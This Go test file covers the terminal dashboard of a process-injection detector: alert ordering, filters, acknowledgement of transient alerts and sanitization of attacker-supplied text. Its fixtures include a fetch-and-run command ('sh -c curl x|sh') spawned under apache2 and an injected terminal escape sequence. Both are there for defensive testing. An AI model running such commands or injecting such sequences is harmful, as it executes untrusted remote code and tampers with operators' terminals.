// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Paul Borile

package tui

import (
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/paulborile/cenziadah/internal/model"
	"github.com/paulborile/cenziadah/internal/scan"
	"github.com/paulborile/cenziadah/internal/version"
)

func rep(pid int, name string, fs ...model.Finding) model.Report {
	return model.Report{Target: model.TargetDesc{PID: pid, Name: name, Exe: "/usr/bin/" + name}, Findings: fs}
}

func sweepWith(reports ...model.Report) sweepMsg {
	return sweepMsg{n: 1, res: scan.Result{Reports: reports, FinishedAt: time.Now(), Stats: scan.Stats{Scanned: len(reports)}}}
}

var (
	critical = model.Finding{Technique: model.TechMapsRWX, Severity: model.SevCritical, Title: "rwx"}
	high     = model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevHigh, Title: "child"}
	jit      = model.Finding{Technique: model.TechMapsAnonExec, Severity: model.SevHigh, Title: "jit", Suppressed: true, SuppressReason: "baseline"}
)

func keys(m *state, ks ...string) {
	for _, k := range ks {
		m.key(k)
	}
}

func TestAlertsSortFirstByWorstSeverity(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	m.Update(sweepWith(rep(1, "init"), rep(50, "victim", high), rep(9, "gjs", jit), rep(70, "evil", critical)))
	var order []int
	for _, r := range m.visible() {
		order = append(order, r.rep.Target.PID)
	}
	want := []int{70, 50, 1, 9} // CRITICAL, HIGH, then SAFE by pid (suppressed JIT is SAFE)
	for i := range want {
		if order[i] != want[i] {
			t.Fatalf("order = %v, want %v", order, want)
		}
	}
}

func TestAlertsOnlyFilter(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	m.Update(sweepWith(rep(1, "init"), rep(50, "victim", high)))
	keys(m, "a")
	if v := m.visible(); len(v) != 1 || v[0].rep.Target.PID != 50 {
		t.Fatalf("alerts-only shows %+v", v)
	}
	keys(m, "a")
	if len(m.visible()) != 2 {
		t.Error("second 'a' should show all again")
	}
}

func TestCursorFollowsPidAcrossSweeps(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	m.Update(sweepWith(rep(1, "a"), rep(2, "b"), rep(3, "c")))
	keys(m, "down", "down")                                          // on pid 3
	m.Update(sweepWith(rep(1, "a"), rep(2, "b"), rep(3, "c", high))) // pid 3 jumps to top
	if got := m.visible()[m.cursor].rep.Target.PID; got != 3 {
		t.Errorf("cursor on pid %d after resort, want 3", got)
	}
}

func TestDetailViewShowsFindingsAndSanitizes(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	evil := high
	evil.Detail = "cmd=\x1b[2Jboom"
	m.Update(sweepWith(rep(50, "victim", evil, jit)))
	keys(m, "enter")
	out := m.View()
	if !strings.Contains(out, "ALERT: 1 active finding") || !strings.Contains(out, "1 suppressed as known-good") {
		t.Errorf("detail view missing verdicts:\n%s", out)
	}
	if strings.Contains(out, "\x1b[2J") {
		t.Error("attacker escape sequence reached the terminal")
	}
	keys(m, "esc")
	if m.detail {
		t.Error("esc should return to the list")
	}
}

func TestRescanKeyIsNonBlocking(t *testing.T) {
	rescan := make(chan struct{}) // unbuffered, nobody receiving: a busy loop
	m := newModel(rescan, time.Second)
	done := make(chan struct{})
	go func() { keys(m, "r"); close(done) }()
	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("'r' blocked the UI while the loop was busy")
	}
}

func TestQuitKey(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	_, cmd := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("q")})
	if cmd == nil {
		t.Fatal("q should return a quit command")
	}
	if _, ok := cmd().(tea.QuitMsg); !ok {
		t.Error("q did not quit")
	}
}

func TestSkippedRowsToggleAndExplain(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	msg := sweepWith(rep(1, "init"))
	msg.res.Skipped = []scan.Skipped{
		{PID: 2, Name: "kthreadd", Reason: scan.ReasonKernel},
		{PID: 77, Name: "victim", Exe: "/opt/victim", Reason: scan.ReasonPermission},
	}
	m.Update(msg)
	if len(m.visible()) != 1 {
		t.Fatalf("skipped rows must be hidden by default, visible=%d", len(m.visible()))
	}
	keys(m, "s")
	v := m.visible()
	if len(v) != 2 || v[1].rep.Target.PID != 77 {
		t.Fatalf("'s' should list the non-kernel skipped process last: %+v", v)
	}
	keys(m, "end", "enter")
	if out := m.View(); !strings.Contains(out, "NOT INSPECTED: permission denied") || !strings.Contains(out, "run watch as root") {
		t.Errorf("skipped detail should explain why:\n%s", out)
	}
}

func TestLearnedFindingsShownInDetail(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	res := scan.Result{
		Reports:  []model.Report{rep(50, "victim", jit)},
		Accepted: []model.Event{{Kind: model.EventLearned, Target: model.TargetDesc{PID: 50, Name: "victim"}, Finding: critical}},
	}
	m.Update(learnedMsg{identities: 1, res: res})
	if !strings.Contains(m.headerLine(), "1 accepted at learn") {
		t.Errorf("header should count accepted findings: %q", m.headerLine())
	}
	keys(m, "enter")
	if out := m.View(); !strings.Contains(out, "already present when the baseline was learned") {
		t.Errorf("detail should list learned findings:\n%s", out)
	}
}

func TestNewProgramsAnnounced(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	msg := sweepWith(rep(20, "code"))
	msg.res.NewPrograms = []model.TargetDesc{{PID: 20, Name: "code", Exe: "/usr/share/code/code"}}
	m.Update(msg)
	out := m.View()
	if !strings.Contains(m.headerLine(), "1 new programs learned") || !strings.Contains(out, "new program /usr/share/code/code") {
		t.Errorf("auto-learned program not announced:\n%s", out)
	}
}

func TestBaseColumnAndCounts(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	a, b, c := rep(1, "init"), rep(20, "tail"), rep(30, "evil", critical)
	a.Baseline, b.Baseline, c.Baseline = model.BaselineChecked, model.BaselineNew, model.BaselineNone
	msg := sweepWith(a, b, c)
	msg.res.Skipped = []scan.Skipped{{PID: 40, Name: "bash", Reason: scan.ReasonTooYoung, Baseline: model.BaselineKnown}}
	m.Update(msg)
	if got := m.baseCounts(); got != "1 checked · 1 new · 1 none" {
		t.Errorf("baseCounts = %q", got)
	}
	out := m.View()
	for _, want := range []string{"BASE", "checked", "new", "none"} {
		if !strings.Contains(out, want) {
			t.Errorf("list missing %q:\n%s", want, out)
		}
	}
	keys(m, "s")
	if out := m.View(); !strings.Contains(out, "WAIT") || !strings.Contains(out, "known") {
		t.Errorf("waiting process should show WAIT / known:\n%s", out)
	}
	keys(m, "home", "enter") // evil (ALERT) sorts first
	if out := m.View(); !strings.Contains(out, "baseline none: no baseline") {
		t.Errorf("detail should explain the baseline state:\n%s", out)
	}
}

// The production case: apache2 had an unexpected child for one sweep; the child
// exited and the finding resolved. The alert must stay visible until
// acknowledged, with the child's details, in the row, the detail and the history.
func TestTransientAlertStaysUntilAcknowledged(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	child := model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevHigh,
		Title: "unexpected child process", Detail: `pid=999 exe=/usr/bin/dash cmd="sh -c curl x|sh"`}
	apache := model.TargetDesc{PID: 1384, Name: "apache2", Exe: "/usr/sbin/apache2"}
	at := time.Date(2026, 10, 12, 14, 12, 18, 0, time.UTC)

	alerting := sweepWith(rep(1, "init"), model.Report{Target: apache, Findings: []model.Finding{child}})
	alerting.events = []model.Event{{Kind: model.EventNew, At: at, Target: apache, Finding: child}}
	m.Update(alerting)

	clean := sweepWith(rep(1, "init"), model.Report{Target: apache})
	clean.events = []model.Event{{Kind: model.EventResolved, At: at.Add(10 * time.Second), Target: apache, Finding: child}}
	m.Update(clean)

	v := m.visible()
	if v[0].rep.Target.PID != 1384 || v[0].sticky == nil || v[0].alert() {
		t.Fatalf("resolved alert should be a WAS! row on top, got %+v", v[0])
	}
	if out := m.View(); !strings.Contains(out, "WAS!") || !strings.Contains(m.headerLine(), "1 unacknowledged") {
		t.Errorf("list should mark the earlier alert:\n%s", out)
	}
	if out := m.View(); !strings.Contains(out, "exe=/usr/bin/dash") {
		t.Errorf("recent changes should name the child:\n%s", out)
	}

	keys(m, "enter")
	out := m.View()
	if !strings.Contains(out, "earlier alerts, not acknowledged") || !strings.Contains(out, "resolved 14:12:28") ||
		!strings.Contains(out, `cmd="sh -c curl x|sh"`) {
		t.Errorf("detail should keep the full earlier alert:\n%s", out)
	}
	keys(m, "c")
	if m.visible()[0].sticky != nil || strings.Contains(m.headerLine(), "unacknowledged") {
		t.Error("c should acknowledge the selected row")
	}
	keys(m, "esc")
	if m.visible()[0].rep.Target.PID != 1 {
		t.Error("after acknowledging, apache2 is an ordinary SAFE row again (sorted by pid)")
	}
}

func TestExitedProcessAlertKeepsRow(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	victim := model.TargetDesc{PID: 50, Name: "victim", Exe: "/opt/victim"}
	msg := sweepWith(rep(1, "init"), model.Report{Target: victim, Findings: []model.Finding{critical}})
	msg.events = []model.Event{{Kind: model.EventNew, At: time.Now(), Target: victim, Finding: critical}}
	m.Update(msg)
	m.Update(sweepWith(rep(1, "init"))) // victim exited

	v := m.visible()
	if len(v) != 2 || !v[0].gone || v[0].rep.Target.PID != 50 {
		t.Fatalf("exited process with an alert must keep a row: %+v", v)
	}
	if out := m.View(); !strings.Contains(out, "(exited)") {
		t.Errorf("row should say the process exited:\n%s", out)
	}
	keys(m, "C")
	if len(m.visible()) != 1 {
		t.Error("C should acknowledge everything; the exited row disappears")
	}
}

func TestInfoEventsAreNotSticky(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	info := model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevInfo, Title: "child"}
	msg := sweepWith(rep(7, "x"))
	msg.events = []model.Event{{Kind: model.EventNew, At: time.Now(), Target: model.TargetDesc{PID: 7}, Finding: info}}
	m.Update(msg)
	if len(m.sticky) != 0 {
		t.Error("INFO findings must not create sticky alerts")
	}
}

func TestHistoryView(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	for i := 0; i < 3; i++ {
		msg := sweepWith(rep(1, "init"))
		msg.events = []model.Event{{Kind: model.EventNew, At: time.Now(), Target: model.TargetDesc{PID: 100 + i, Name: "p"},
			Finding: model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevHigh, Detail: "exe=/bin/sh"}}}
		m.Update(msg)
	}
	keys(m, "h")
	out := m.View()
	if !strings.Contains(out, "history: 3 event(s)") || strings.Index(out, "pid=102") > strings.Index(out, "pid=100") ||
		!strings.Contains(out, "exe=/bin/sh") {
		t.Errorf("history should list all events newest first with details:\n%s", out)
	}
	keys(m, "esc")
	if m.history {
		t.Error("esc should leave the history")
	}
}

func TestHeaderShowsVersion(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	if !strings.Contains(m.headerLine(), "cenziadah "+version.Version+" watch") {
		t.Errorf("header should show the version: %q", m.headerLine())
	}
}

// LOW findings (a new but package-installed child) are recorded, not alerts:
// the row stays SAFE with its finding count, and no WAS! marker is left.
func TestLowFindingIsNotAnAlert(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	low := model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevLow, Title: "new child program"}
	msg := sweepWith(model.Report{Target: model.TargetDesc{PID: 2122, Name: "master"}, Findings: []model.Finding{low}})
	msg.events = []model.Event{{Kind: model.EventNew, At: time.Now(), Target: model.TargetDesc{PID: 2122}, Finding: low}}
	m.Update(msg)
	r := m.visible()[0]
	if r.alert() || r.active != 1 || len(m.sticky) != 0 || m.alerts() != 0 {
		t.Errorf("LOW must not alert or stick: alert=%v active=%d sticky=%d", r.alert(), r.active, len(m.sticky))
	}
}

func TestLowOnlyDetailSaysSafe(t *testing.T) {
	m := newModel(make(chan struct{}, 1), time.Second)
	low := model.Finding{Technique: model.TechUnexpectedChild, Severity: model.SevLow, Title: "new child program"}
	m.Update(sweepWith(model.Report{Target: model.TargetDesc{PID: 1, Name: "systemd"}, Findings: []model.Finding{low}}))
	keys(m, "enter")
	if out := m.View(); strings.Contains(out, "ALERT:") || !strings.Contains(out, "SAFE: 1 low-severity finding") {
		t.Errorf("LOW-only detail must say SAFE:\n%s", out)
	}
}
